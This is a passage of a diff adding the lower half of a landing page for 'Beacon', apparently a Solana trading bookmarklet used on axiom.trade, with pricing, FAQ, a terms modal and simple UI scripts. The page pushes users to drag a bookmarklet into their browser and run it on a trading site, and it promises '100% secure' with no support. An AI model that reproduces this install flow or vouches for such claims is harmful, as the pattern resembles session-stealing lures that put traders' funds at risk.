+                            MEV Protection
+                        </li>
+                    </ul>
+                    <button class="w-full py-4 rounded-xl glass text-white font-medium hover:bg-white/10 transition-colors">
+                        Get Started Free
+                    </button>
+                </div>
+
+                <!-- Pro -->
+                <div class="pricing-card pro animate-on-scroll">
+                    <div class="pricing-badge">Most Popular</div>
+                    <div class="pricing-header text-center mb-8">
+                        <h3 class="text-2xl font-bold text-white mb-4">Pro</h3>
+                        <div class="text-4xl font-bold text-gradient-primary mb-2">1 SOL</div>
+                        <p class="text-white/50">lifetime</p>
+                    </div>
+                    <ul class="space-y-4 mb-8">
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Everything in Free
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Multi-Wallet Management
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Priority Transaction Speed
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Whale Movement Predictions
+                        </li>
+                        <li class="flex items-center gap-3 text-white/80">
+                            <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+                            Private Alpha Signals
+                        </li>
+                    </ul>
+                    <button class="w-full py-4 rounded-xl bg-gradient-to-r from-violet-500 to-fuchsia-500 text-white font-medium hover:opacity-90 transition-opacity shadow-[0_4px_15px_rgba(139,92,246,0.4)]">
+                        Upgrade to Pro
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section id="faq" class="py-32 px-4 border-y border-white/5">
+        <div class="max-w-3xl mx-auto">
+            <div class="text-center mb-16 animate-on-scroll">
+                <h2 class="text-4xl sm:text-5xl font-bold mb-6">
+                    Frequently Asked <span class="text-gradient-primary">Questions</span>
+                </h2>
+            </div>
+
+            <div class="space-y-4">
+                <details class="faq-item animate-on-scroll">
+                    <summary>
+                        What's the difference between Free and Pro?
+                        <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
+                    </summary>
+                    <div class="faq-content">
+                        Free includes all core features like Influencer Sniper, Wallet Stalker, and basic analytics. Pro adds advanced multi-wallet management, custom strategies, whale predictions, priority speed, and private alpha signals.
+                    </div>
+                </details>
+
+                <details class="faq-item animate-on-scroll">
+                    <summary>
+                        Is this secure? Do you access my wallet?
+                        <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
+                    </summary>
+                    <div class="faq-content">
+                        100% secure. Beacon runs entirely in your browser and never asks for private keys. It helps you execute trades faster on axiom.trade, but you approve every transaction.
+                    </div>
+                </details>
+
+                <details class="faq-item animate-on-scroll">
+                    <summary>
+                        How do I install the bookmarklet?
+                        <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
+                    </summary>
+                    <div class="faq-content">
+                        Simply drag the "Activate Beacon" button from the hero section to your browser's bookmarks bar. Then visit axiom.trade and click the bookmark to activate. If you don't see the bookmarks bar, press Ctrl+Shift+B (Cmd+Shift+B on Mac).
+                    </div>
+                </details>
+
+                <details class="faq-item animate-on-scroll">
+                    <summary>
+                        Can I really beat other bots?
+                        <svg class="w-5 h-5 text-violet-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
+                    </summary>
+                    <div class="faq-content">
+                        Beacon gives you a massive advantage through automation, signal detection, and MEV protection. Pro users get even more advantages with whale predictions and priority transaction speed.
+                    </div>
+                </details>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-12 px-4">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex flex-col md:flex-row items-center justify-between gap-6 pb-8 border-b border-white/10">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-violet-500 to-fuchsia-500 flex items-center justify-center">
+                        <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                        </svg>
+                    </div>
+                    <span class="text-xl font-bold text-white">Beacon</span>
+                </div>
+                <div class="flex items-center gap-6">
+                    <a href="#features" class="text-sm text-white/60 hover:text-white transition-colors">Features</a>
+                    <a href="#pricing" class="text-sm text-white/60 hover:text-white transition-colors">Pricing</a>
+                    <a href="#faq" class="text-sm text-white/60 hover:text-white transition-colors">FAQ</a>
+                </div>
+            </div>
+            <div class="pt-8 text-center">
+                <p class="text-xs text-white/40 max-w-2xl mx-auto mb-4">
+                    Disclaimer: Beacon is for educational and automation purposes. Trading cryptocurrency carries substantial risk. Never invest more than you can afford to lose. Past performance does not guarantee future results.
+                </p>
+                <p class="text-sm text-white/40">© 2024 Beacon. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div id="terms-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="absolute top-4 right-4 text-violet-400 hover:text-white text-2xl" onclick="closeTermsModal()">×</button>
+            <div class="text-center mb-6">
+                <h3 class="text-2xl font-bold text-white mb-2">Important Notice</h3>
+                <p class="text-white/60">Terms & Conditions</p>
+            </div>
+            <p class="text-white/80 text-center mb-6">
+                Please review and accept the terms and conditions on axiom.trade before proceeding. This is required for Beacon to function properly.
+            </p>
+            <button onclick="closeTermsModal()" class="w-full py-3 rounded-xl bg-gradient-to-r from-violet-500 to-fuchsia-500 text-white font-medium hover:opacity-90 transition-opacity">
+                I Understand
+            </button>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        // Drag handlers
+        function handleDragStart(event) {
+            const emptyImg = new Image();
+            emptyImg.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+            event.dataTransfer.setDragImage(emptyImg, 0, 0);
+            event.target.style.opacity = '0.6';
+            event.target.style.transform = 'scale(0.95)';
+        }
+        
+        function handleDragEnd(event) {
+            event.target.style.opacity = '1';
+            event.target.style.transform = 'scale(1)';
+        }
+        
+        // Scroll to section
+        function scrollToSection(id) {
+            const section = document.getElementById(id);
+            if (section) {
+                section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+        
+        // Modal
+        function showTermsModal() {
+            document.getElementById('terms-modal').classList.add('active');
+        }
+        
+        function closeTermsModal() {
+            document.getElementById('terms-modal').classList.remove('active');
+        }
+        
+        // Intersection Observer for animations
+        document.addEventListener('DOMContentLoaded', function() {
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('animate-in');
+                    }
+                });
+            }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+            
+            document.querySelectorAll('.animate-on-scroll').forEach(el => observer.observe(el));
+        });
+        
+        // Prevent drag drop on page
+        document.addEventListener('dragover', e => e.preventDefault());
+        document.addEventListener('drop', e => e.preventDefault());
+        
+        // Prevent click on bookmarklet
+        const dragBtn = document.getElementById('dragBtn');
+        if (dragBtn) {
+            dragBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                alert("To install: drag this button to your bookmarks bar instead of clicking!");
+            });
+        }
+    </script>
+
+</body>
+</html>
